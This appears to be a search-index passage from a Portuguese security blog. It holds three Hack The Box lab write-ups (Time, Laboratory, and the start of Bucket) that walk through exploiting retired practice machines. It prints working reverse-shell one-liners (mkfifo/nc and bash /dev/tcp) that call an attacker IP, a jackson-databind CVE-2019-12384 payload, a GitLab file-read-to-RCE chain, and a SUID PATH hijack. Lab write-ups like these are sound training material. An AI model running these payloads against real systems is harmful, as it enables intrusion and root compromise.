PowerShell DSC - Azure Arc | Microsoft Docs   Connect hybrid machines to Azure from Windows Admin Center - Azure Arc | Microsoft Docs   Connect hybrid machines to Azure by using PowerShell - Azure Arc | Microsoft Docs   Espero que as orientações compartilhadas lhe sejam úteis para a criação deste deployment via ConfigMgr, permitindo a gestão destes dispositivos a partir da console do Azure.   Até o próximo post! :smile:  ","categories": ["Azure Arc"],
        "tags": ["Azure","Arc","Windows","ConfigMgr","MECM","MEM"],
        "url": "https://davicruz.com/azure-arc/2021/04/install-update-azure-arc-windows-configmgr/",
        "teaser": "https://davicruz.com/assets/images/teaser.png"
      },{
        "title": "Hackthebox write-up: Time",
        "excerpt":"Olá pessoal!   A máquina desta semana será Time, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW e felamos.   :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas      Enumeração   Iniciamos com a enumeração dos serviços publicado a partir de um quick scan do nmap, onde o output se encontra abaixo.   $ nmap -sC -sV -Pn -oA quick 10.10.10.214 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 16:08 -03 Nmap scan report for 10.10.10.214 Host is up (0.077s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA) |   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA) |_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519) 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Online JSON parser Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds   80/TCP - Serviço HTTP   Iniciando a verificação pelo serviço HTTP que executa na porta 80, vemos que temos um serviço de validação e formatação de arquivo JSON      Após executar algumas enumerações utilizando whatweb e nikto não encontrei nada útil, logo parti para a enumeração da aplicação buscando por alguma vulnerabilidade de injeção de código ou LFI.   Analisando a aplicação temos duas funcionalidades: Beautify e Validate:      A opção beautify, ao receber um JSON válido, o formata de forma “bonita” e, ao enviar um request inválido (por exemplo “test”), retorna o valor null.              Já a opção em beta validate verifica a sintaxe do JSON fornecido. Quando enviamos um request inválido (por exemplo “test”), exceção não esperada da aplicação é exibida.       Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN           Acesso inicial   Ao buscar por com.fasterxml.jackson.core encontrei detalhes sobre o projeto Jackson, desenvolvido pela FasterXML e do qual o componente core é base para o jackson-databind, popular pela sua biblioteca de JSON, a qual é implementada neste portal para as funcionalidades de validação e formatação.   Pesquisando por CVEs para o jackson-databind, os seguintes foram encontrados para execução de código em 2019, de acordo com o site CVE Details:      Dos 4 itens listados, encontrei para o CVE-2019-12384 um PoC funcional neste blog, o qual utilizei para obter o acesso inicial. Os seguintes passos foram executados para obter um shell reverso:           Criação de um arquivo inject.sql com o código abaixo, modificado da versão do blog para iniciar um shell reverso para a máquina atacante na porta 4443 e publicado usando um servidor HTTP python3 (sudo python3 -m http.server 80) a partir do diretório de onde o arquivo se encontra.       CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {     String[] command = {\"bash\", \"-c\", cmd};     java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\"\\\\A\");     return s.hasNext() ? s.next() : \"\";  } $$; CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f')           Configurando listener via netcat com o comando nc -lnvp 4443.        Enviado o payload abaixo na aplicação no lugar do JSON a ser validado.       [\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'\"}]                 User flag   Após upgrade do shell, iniciado enumeração e identificado que o usuário utilizado, pericles, era um usuário comum do Linux e não possuía nenhum tipo de privilégio especial.   pericles@time:/var/www/html$ id uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)   Acessando seu diretório raiz, encontrado o user.txt onde foi obtido o primeiro flag.   pericles@time:/var/www/html$ cd ~ pericles@time:/home/pericles$ cat user.txt  &lt;redacted&gt; pericles@time:/home/pericles$    Root flag   Antes de dar continuidade na enumeração, para simplificar o processo de obtenção de um shell reverso se necessário, criado uma chave SSH usando o ssh-keygen e incluído a chave pública no arquivo ~/.ssh/authorized_keys, o que nos permidiu conectar diretamente ao usuário pericles via SSH.   A enumeração foi realizada utilizando o script linpeas.sh e um dos itens encontrados chamou bastante atenção, fazendo referência ao nome da máquina: um arquivo shell de propriedade do usuário pericles no caminho /usr/bin/timer_backup.sh.   Este arquivo está configurado para execução através de um system timer (/etc/systemd/system/timer_backup.timer e /etc/systemd/system/timer_backup.service) e configurado para execução a cada 10s com privilegios de root.   Como temos privilégios para editar o shell script, inclui a linha abaixo para obter um shell reverso e, após alguns segundos, recebi um shell reverso! :smile:   rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/g   Como o processo é reexecutado após 10s, todos os processos existentes são finalizados e perdemos a conexão com a máquina. Apenas obter o flag de root é uma tarefa possível neste tempo, o que foi utilizado inicialmente.   $ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.214] 33304 /bin/sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt &lt;redacted&gt; #         Caso queira uma conexão mais persistente temos duas opções iniciais:      Configurar o system timer para incluir a chave pública no arquivo /root/.ssh/authorized_keys, nos permitindo conectar via SSH como root.   Iniciar outro shell reverso assim que obtermos a conexão inicial, que pode ser alcançado de múltiplas formas como Metasploit AutoRunScript e colocando uma instrução para ser passada assim que uma conexão via netcat é estabelecida, conforme podemos ver abaixo onde o comando id é executado assim que a sessão é iniciada:   printf \"id\\n\" | nc -lnvp 4443   Espero que tenha sido útil e vejo vocês no próximo post! :smiley:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-medium","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/04/htb-time/",
        "teaser": "https://i.imgur.com/dL9pe5L.png"
      },{
        "title": "Hackthebox write-up: Laboratory",
        "excerpt":"Olá pessoal!   A máquina desta semana será Laboratory, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xc45.    :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas      Enumeração   Conforme de costume, iniciamos com a enumeração básica dos serviços utilizando o nmap com um quick scan:   $ nmap -sC -sV -Pn -oA quick 10.10.10.216                                                                    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 15:50 -03 Nmap scan report for 10.10.10.216 Host is up (0.16s latency). Not shown: 997 filtered ports PORT    STATE SERVICE  VERSION 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA) |   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA) |_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519) 80/tcp  open  http     Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to https://laboratory.htb/ 443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: The Laboratory | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Not valid before: 2020-07-05T10:39:28 |_Not valid after:  2024-03-03T10:39:28 | tls-alpn:  |_  http/1.1 Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.96 seconds   Após execução notamos que existem, além do serviço de SSH, dois serviços HTTP (HTTP e HTTPs em suas respectivas portas padrão) que fazem menção às entradas de DNS laboratory.htb e git.laboratory.htb, os quais foram incluidos no arquivo hosts da máquina para melhor enumeração destes serviços.   80/TCP - Serviço HTTP   Uma vez acessado serviço HTTP tanto no IP quanto em qualquer um dos DNS que pudemos observar de acordo com o scan do nmap, ocorre um redirecionamento para o HTTPS, que funciona na porta 443/TCP, que será discutido a seguir.   443/TCP - Serviço HTTPS   Ao enumerar os serviços HTTPS em ambos os DNS, pudemos notar algumas diferenças nos serviços publicados.   https://laboratory.htb   Ao navegar para a página https://laboratory.htb, temos um site institucional relacionado a uma empresa de segurança com Dexter, Dee Dee e Anonymous como funcionários, porém nenhum link interessante para dar continuidade na exploração.      Gobuster   Para verificar se alguma outra página existe neste website, realizei o scan utilizando o gobuster porém nada interessante foi encontrado.   $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://laboratory.htb -x html,php,txt -k =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            https://laboratory.htb [+] Threads:        10 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes:   200,204,301,302,307,401,403 [+] User Agent:     gobuster/3.0.1 [+] Extensions:     html,php,txt [+] Timeout:        10s =============================================================== 2021/02/18 16:12:44 Starting gobuster =============================================================== /images (Status: 301) /index.html (Status: 200) /assets (Status: 301) /CREDITS.txt (Status: 200) Progress: 38301 / 220561 (17.37%)   https://git.laboratory.htb   Uma vez acessado o serviço, notado que se tratava de um servidor GitLab, conforme podemos ver na imagem abaixo.      Após algumas pesquisas, notei que na API V3 seria possivel realizar algumas enumerações não autenticadas, o que não foi possível neste caso, já que neste caso temos uma API V4.   $ curl -L https://git.laboratory.htb/api/v3/internal/check -k                                                {\"error\":\"API V3 is no longer supported. Use API V4 instead.\"}                                                                                                                 $ curl -L https://git.laboratory.htb/api/v4/internal/check -k                                                {\"message\":\"401 Unauthorized\"}   Já que a enumeração via métodos encontrados em outros artigos também não funcionou, segui para a criação de uma conta, para qual foi requerido o uso de uma conta de um domínio autorizado (laboratory.htb) mas que mesmo assim foi criada com sucesso.   Uma vez logado com a conta recém-criada, segui para a exploração dos repositórios públicos, onde encontrei um repositório chamado SecureWebSite.      Ao navegar no repositório, pude notar de que se tratava do site publicado na URL https://laboratory.htb, de onde poderíamos obter alguma informação interessante, porém conforme já era esperado se trata apenas de um single page application sem funcionalidades que pudéssemos explorar.   Entretanto, uma vez logado no portal, ao acessar o menu Help &gt; Help podemos identificar a versão do GitLab em execução, que é a 12.8.1 Community      Buscando no searchsploit encontradas algumas vulnerabilidades que poderiam ser exploradas, identificadas como Arbitrary File Read.   $ searchsploit gitlab ----------------------------------------------------------------------- ---------------------------------  Exploit Title                                                         |  Path ----------------------------------------------------------------------- --------------------------------- GitLab - 'impersonate' Feature Privilege Escalation                    | ruby/webapps/40236.txt GitLab 11.4.7 - RCE (Authenticated)                                    | ruby/webapps/49334.py Gitlab 11.4.7 - Remote Code Execution                                  | ruby/webapps/49257.py GitLab 11.4.7 - Remote Code Execution (Authenticated)                  | ruby/webapps/49263.py GitLab 12.9.0 - Arbitrary File Read                                    | ruby/webapps/48431.txt Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                    | ruby/webapps/49076.py Gitlab 6.0 - Persistent Cross-Site Scripting                           | php/webapps/30329.sh Gitlab-shell - Code Execution (Metasploit)                             | linux/remote/34362.rb Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting      | java/webapps/47927.txt NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution        | json/webapps/47420.txt ----------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   Após algumas tentativas com os scripts do searchsploit não obtive o sucesso esperado. Em nova busca acabei encontrando o CVE-2020-10977 no MITRE que está relacionado à esta vulnerabilidade e, a partir desta informação, encontrei outros exploits a serem testados, sendo o disponível no repositório thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Read (github.com) o utilizado.   Com este script, pude confirmar que o servidor continua vulnerável à exploração conforme possibilidade de obter o arquivo /etc/passwd.   $ python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd                                    ----------------------------------                                                                        --- CVE-2020-10977 ---------------        --- GitLab Arbitrary File Read ---                --- 12.9.0 &amp; Below ---------------     ----------------------------------                                                                                                                                                                                  [&gt;] Found By : vakzz       [ https://hackerone.com/reports/827052 ] [&gt;] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]                                                                                                           [+] Target        : https://git.laboratory.htb                                                            [+] Username      : dummy                                                                                 [+] Password      : P@ssw0rd [+] Project Names : ProjectOne, ProjectTwo  [!] Trying to Login...          [+] Login Successful! [!] Creating ProjectOne... [+] ProjectOne Created Successfully! [!] Creating ProjectTwo... [+] ProjectTwo Created Successfully! [&gt;] Absolute Path to File : /etc/passwd [!] Creating an Issue... [+] Issue Created Successfully! [!] Moving Issue... [+] Issue Moved Successfully! [+] File URL : https://git.laboratory.htb/dummy/ProjectTwo/uploads/09bddb24c9ac93d1a011f6ed14054a66/passwd  &gt; /etc/passwd   Verificando o conteúdo do /etc/passwd podemos notar que os usuários desta máquina, além de root e ssh foram criados e utilizam basicamente a mesma raiz de diretório em /var/opt/gitlab, onde vamos buscar por arquivos interessantes   $ cat etc_passwd | grep sh | awk -F\":\" '{print $6\",\"$1}' /root,root /var/run/sshd,sshd /var/opt/gitlab,git /var/opt/gitlab/postgresql,gitlab-psql /var/opt/gitlab/mattermost,mattermost /var/opt/gitlab/registry,registry /var/opt/gitlab/prometheus,gitlab-prometheus /var/opt/gitlab/consul,gitlab-consul   Initial Foothold   Já sabendo das contas da máquina e da possibilidade de leitura de arquivos arbitrários, pesquisei sobre como converter essa possibilidade em RCE, para assim obter um shell reverso. Após algumas leituras encontrei um módulo do Metasploit que se utiliza desta mesma vulnerabilidade para obter o secret_key_base do GitLab, e assim, com uma chamada de deserialization do cookie emitido, obter um shell reverso com a conta git.   msf6 exploit(multi/http/gitlab_file_read_rce) &gt; run  [*] Started reverse TCP handler on 10.10.10.10:4444  [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version. [*] Logged in to user jdoe [*] Created project /jdoe/vWL4JJIQ [*] Created project /jdoe/NVfFvw3v [*] Created issue /jdoe/vWL4JJIQ/issues/1 [*] Executing arbitrary file load [+] File saved as: '/home/zurc/.msf4/loot/20210219090516_default_10.10.10.216_gitlab.secrets_242811.txt' [+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 [*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read [*] Attempting to delete project /jdoe/vWL4JJIQ [*] Deleted project /jdoe/vWL4JJIQ [*] Attempting to delete project /jdoe/NVfFvw3v [*] Deleted project /jdoe/NVfFvw3v [*] Command shell session 1 opened (10.10.10.10:4444 -&gt; 10.10.10.216:35138) at 2021-02-19 09:05:22 -0300  id uid=998(git) gid=998(git) groups=998(git)   User flag   Com acesso à máquina iniciada enumeração utilizando o linpeas.sh do PEAS Suite que me ajudou muito a entender as possibilidades de exploração do GitLab, uma vez que não conheço bem a implementação do serviço. O Script detecta o serviço instalado e trouxe algumas informações interessantes sobre a máquina em questão:      Enumeração das contas, onde pudemos notar que o usuário dexter (admin@example.com) é administrador.   Execução dentro de um docker container, onde futuramente precisaremos escapá-lo para a máquina de fato.   Um dos pontos colocados pelo linpeas.sh durante a enumeração é a possibilidade de alterar a senha de qualquer usuário, o que tivemos sucesso a partir da execução dos comandos abaixo:   git@git:~/gitlab-rails$ gitlab-rails console --------------------------------------------------------------------------------  GitLab:       12.8.1 (d18b43a5f5a) FOSS  GitLab Shell: 11.0.0  PostgreSQL:   10.12 -------------------------------------------------------------------------------- Loading production environment (Rails 6.0.2) irb(main):001:0&gt; user = User.find_by(email: \"admin@example.com\") =&gt; #&lt;User id:1 @dexter&gt; irb(main):002:0&gt; user.password = \"P@ssw0rd\" =&gt; \"P@ssw0rd\" irb(main):003:0&gt; user.password_confirmation = \"P@ssw0rd\" =&gt; \"P@ssw0rd\" irb(main):004:0&gt; user.save! Enqueued ActionMailer::DeliveryJob (Job ID: 0f18c1b4-9929-47a5-90d7-ec16a7e6f293) to Sidekiq(mailers) with arguments: \"DeviseMailer\", \"password_change\", \"deliver_now\", #&lt;GlobalID:0x00007fa424ee0668 @uri=#&lt;URI::GID gid://gitlab/User/1&gt;&gt; =&gt; true irb(main):005:0&gt;    Após alterada a senha, foi possível visualizar para a conta dexter um repositório privado adicional chamado SecureDocker.      Já que temos acesso ao código-fonte do repositório, notado que existem alguns scripts e chave SSH do usuário dexter, conforme mencionado na descrição do repositório.      CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I’ll figure that out later.    Após clonar o repositório para máquina local observados os seguintes arquivos.   $ git -c http.sslVerify=false clone http://git.laboratory.htb/dexter/securedocker.git   Cloning into 'securedocker'... Username for 'https://git.laboratory.htb': dexter Password for 'https://dexter@git.laboratory.htb':  warning: redirecting to https://git.laboratory.htb/dexter/securedocker.git/ remote: Enumerating objects: 10, done. remote: Counting objects: 100% (10/10), done. remote: Compressing objects: 100% (9/9), done. remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (10/10), done.   $ tree -a -I '.git' . ├── create_gitlab.sh ├── dexter │   ├── recipe.url │   ├── .ssh │   │   ├── authorized_keys │   │   └── id_rsa │   └── todo.txt └── README.md  2 directories, 6 files   Assim como na máquina Luanne, realizado a conversão da chave para RSA, utilizando os comandos abaixo:   $ chmod 600 id_rsa $ ssh-keygen -p -m PEM -f ./id_rsa Key has comment 'root@laboratory' Enter new passphrase (empty for no passphrase):  Enter same passphrase again:  Your identification has been saved with the new passphrase.   Após o procedimento mencionado, foi possível conectar-se à máquina via SSH e obter a flag a partir do usuário dexter.     $ ssh -i id_rsa dexter@10.10.10.216   dexter@laboratory:~$ ls -la   total 40   drwxr-xr-x 6 dexter dexter 4096 Oct 22 08:42 .   drwxr-xr-x 3 root   root   4096 Jun 26  2020 ..   lrwxrwxrwx 1 root   root      9 Jul 17  2020 .bash_history -&gt; /dev/null   -rw-r--r-- 1 dexter dexter  220 Feb 25  2020 .bash_logout   -rw-r--r-- 1 dexter dexter 3771 Feb 25  2020 .bashrc   drwx------ 2 dexter dexter 4096 Jun 26  2020 .cache   drwx------ 2 dexter dexter 4096 Oct 22 08:14 .gnupg   drwxrwxr-x 3 dexter dexter 4096 Jun 26  2020 .local   -rw-r--r-- 1 dexter dexter  807 Feb 25  2020 .profile   drwx------ 2 dexter dexter 4096 Jun 26  2020 .ssh   -r--r----- 1 root   dexter   33 Feb 19 11:06 user.txt   dexter@laboratory:~$ cat user.txt    &lt;redacted&gt;   Root flag   Após executar linpeas.sh novamente, desta vez na máquina de fato, notei que existe um arquivo SUID, com permissão atribuida para o usuário dexter.   dexter@laboratory:~$ ls -la /usr/local/bin/docker-security -rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security   Ao executar este binário, não observei nenhum output, assim como não exibe nenhum tipo de informação/ajuda usando parametros como --version e --help. Analisando o mesmo mais a fundo notei que se trata de um arquivo executável, o qual pode conter alguma informação do que se utiliza para algum eventual path hijack ou buffer overflow.   dexter@laboratory:~$ file /usr/local/bin/docker-security /usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped   Antes de utilizar ferramentas de disassembly, inspecionado as strings do arquivo a partir da máquina atacante (uma vez que a máquina não possui o binário strings) e algumas entradas chamaram a atenção, sendo elas a chamada do binário chmod para redefinir as permissões no diretório docker, porém sem especificar o caminho completo. Isso implica que este app é vulnerável path hijacking.   $ strings docker-security [...]  []A\\A]A^A_ chmod 700 /usr/bin/docker chmod 660 /var/run/docker.sock ;*3$\" GCC: (Debian 10.1.0-6) 10.1.0  [...]   Path hijack   Para obter privilégios de root, uma vez que o binário que possui SUID é vulnerável, o primeiro passo é criar um chmod falso, neste caso gerando um shell reverso, seguido da alteração do PATH para que o caminho onde o arquivo localizado seja buscado no início da execução.   dexter@laboratory:~$ echo '#!/bin/bash' &gt; /dev/shm/chmod dexter@laboratory:~$ echo 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4443 0&gt;&amp;1' &gt;&gt; /dev/shm/chmod dexter@laboratory:~$ chmod +x /dev/shm/chmod dexter@laboratory:~$ PATH=/dev/shm:$PATH dexter@laboratory:~$ echo $PATH /dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin   Após configurar um listener na porta especificada (nc -lnvp 4443) executado o binário docker-security o que retornou um shell reverso com privilégios de root, permitindo assim a obtenção da flag.   $ nc -lnvp 4443                                                                                              listening on [any] 4443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.216] 44754 root@laboratory:~# id   id uid=0(root) gid=0(root) groups=0(root),1000(dexter) root@laboratory:~# cat /root/root.txt cat /root/root.txt &lt;redacted&gt;   Espero que tenham gostado!   Vejo vocês novamente em breve! :smiley:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-easy","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/04/htb-laboratory/",
        "teaser": "https://i.imgur.com/t7eWqy0.png"
      },{
        "title": "Hackthebox write-up: Bucket",
        "excerpt":"Olá pessoal!   A máquina desta semana será Bucket, outra máquina classificada como mediana do Hack The Box, criada por MrR3boot.    :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.      Particularmente achei essa máquina bem legal, onde tive a oportunidade de “brincar” um pouco com os serviços de armazenamento da AWS, mesmo que em uma instância local para desenvolvedores.   A sua resolução esteve bastante ligada a este serviço onde tivemos que identificar uma forma de incluir um arquivo no site publicado para obter um shell reverso, obter a flag de user com credenciais existentes no DynamoDB.   O flag de root foi obtido após abuso de uma aplicação ainda em desenvolvimento, onde utilizamos uma vulnerabilidade de LFI para obter a chave do id_rsa e assim obter acesso interativo com esta conta.   Enumeração   Como de costume, iniciamos com a enumeração rápida do nmap para identificar os serviços publicados nesta máquina:   $ nmap -sC -sV -Pn -oA quick 10.10.10.212 Nmap 7.91 scan initiated Fri Feb 26 08:16:37 2021 as: nmap -sC -sV -Pn -oA quick 10.10.10.212 Nmap scan report for 10.10.10.212 Host is up (0.077s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open  http    Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://bucket.htb/ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 26 08:16:48 2021 -- 1 IP address (1 host up) scanned in 10.55 seconds   80/TCP - Serviço HTTP   Uma vez que notei um redirect para bucket.htb, incluí a entrada no arquivo hosts apontando para o endereço IP da máquina.   Ao acessar o site, notei que diversas imagens não foram carregadas adequadamente, as quais apontavam para s3.bucket.htb, vide chamada curl abaixo. Após incluir também esta entrada no arquivo hosts, o carregamento da página ocorreu com sucesso.   $ curl -L http://bucket.htb | grep -Eo 'href=\".*\"|src=\".*\"' | sort -u   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed 100  5344  100  5344    0     0  33822      0 --:--:-- --:--:-- --:--:-- 33822 href=\"#\" href=\"#\"&gt;&lt;i class=\"fab fa-facebook-square\" href=\"#\"&gt;&lt;i class=\"fab fa-instagram\" href=\"#\"&gt;&lt;i class=\"fab fa-linkedin\" href=\"#\"&gt;&lt;i class=\"fab fa-twitter\" src=\"http://s3.bucket.htb/adserver/images/bug.jpg\" alt=\"Bug\" height=\"160\" width=\"160\" src=\"http://s3.bucket.htb/adserver/images/cloud.png\" alt=\"cheer\" height=\"160\" width=\"160\" src=\"http://s3.bucket.htb/adserver/images/malware.png\" alt=\"Malware\" height=\"160\" width=\"160\"   s3.bucket.htb   Ao identificar o DNS s3.bucket.htb me chamou atenção para o nome, o qual faz referência ao serviço Amazon S3, que provê armazenamento de arquivos no formato blob em nuvem.   Analisando o webserver da requisição para uma das URLs de imagem, notei que se utiliza de outro webserver (hypercorn-h11), diferente do Apache listado no Scan do NMAP para a página na URL bucket.htb, o que significa que temos outro serviço na máquina ou há algum tipo de proxy na requisição neste virtual host.   Para validar o que temos nesta estrutura, realizei uma enumeração utilizando o gobuster e encontrei dois diretórios interessantes: health e shell   $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://s3.bucket.htb -o gobuster-s3.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            http://s3.bucket.htb [+] Threads:        10 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes:   200,204,301,302,307,401,403 [+] User Agent:     gobuster/3.0.1 [+] Timeout:        10s =============================================================== 2021/02/26 09:42:22 Starting gobuster =============================================================== /health (Status: 200) /shell (Status: 200) Progress: 2643 / 220561 (1.20%)   É importante mencionar que são diretórios, pois o resultado para as chamadas em cada um dos nomes via curl com ou sem a barra ao final é diferente, conforme podemos ver abaixo:   $ curl -L http://s3.bucket.htb/health                                                                        {\"services\": {\"s3\": \"running\", \"dynamodb\": \"running\"}}  $ curl -L http://s3.bucket.htb/health/ {\"status\": \"running\"}                                                                                                  $ curl -L http://s3.bucket.htb/shell   $ curl -L http://s3.bucket.htb/shell/ &lt;!DOCTYPE html&gt; &lt;html itemscope itemtype=\"http://schema.org/Product\"&gt;   &lt;head&gt;     &lt;title&gt;AWS Console&lt;/title&gt;     &lt;meta charset=\"UTF-8\"&gt;      &lt;!-- Application --&gt; [...]   Como a última chamada (curl -L http://s3.bucket.htb/shell/) retornou o conteúdo de uma página HTML, refiz a requisição no navegador e notei que estava acessando à página do DynamoDB Web Shell.   Pesquisando um pouco pude chegar à conclusão de que estávamos utilizando um emulador de storage da AWS, possivelmente uma instancia do Localstack, muito popular entre desenvolvedores.      Brincando com alguns dos exemplos da página, consegui listar algumas informações da instancia (ListTables e DescribeTable), conforme abaixo, onde podemos listar algumas informações como a região do serviço (us-east-1) e uma tabela chamada users no DynamoDB, assim como o seu respectivo resource name arn:aws:dynamodb:us-east-1:000000000000:table/users.      Considerando que estamos falando de uma instância do LocalStack, descobri que é possível utilizar o awscli, utilitário de linha de comando da AWS, para se conectar à esta instância local, conforme post Local Development with AWS on LocalStack (reflectoring.io).   Como o awscli é mais flexível para enumerar e trabalhar com os recursos do que o DynamoDB Web Shell, segui para a instalação via apt e sua conexão utilizando as informações obtidas no post acima citado, o qual foi executado conforme abaixo. Para as credenciais, quaisquer valores são válidos, uma vez que não se trata de uma instância real em execução na AWS.   # Install aws cli $ sudo apt install awscli -y [...] $ aws configure --profile bucket.htb                                                                          AWS Access Key ID [None]: dummy AWS Secret Access Key [None]: dummy Default region name [None]: us-east-1 Default output format [None]:   Lendo a documentação do awscli para o DynamoDB, executei algumas consultas simples para listar as tabelas e entradas existentes, conforme abaixo, onde pude obter alguns usuários e senhas que poderão ser úteis futuramente.   $ aws dynamodb list-tables \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb \\     --output json {   \"TableNames\": [     \"users\"   ] }  $ aws dynamodb scan \\     --table-name users \\     --endpoint-url http://s3.bucket.htb \\     --profile bucket.htb \\     --output json {   \"Items\": [     {       \"password\": {         \"S\": \"Management@#1@#\"       },       \"username\": {         \"S\": \"Mgmt\"       }     },     {       \"password\": {         \"S\": \"Welcome123!\"       },       \"username\": {         \"S\": \"Cloudadm\"       }     },     {       \"password\": {         \"S\": \"n2vM-&lt;_K_Q:.Aa2\"       },       \"username\": {         \"S\": \"Sysadm\"       }     }   ],   \"Count\": 3,   \"ScannedCount\": 3,   \"ConsumedCapacity\": null }   Como sabemos que temos um s3 também em execução, enumerei algumas informações sobre os containers blob existentes, onde foi encontrado o adserver (o que já tínhamos uma ideia por conta da URL das imagens conforme previamente enumerado) e confirmamos qual o conteúdo deste bucket.   $ aws s3 ls 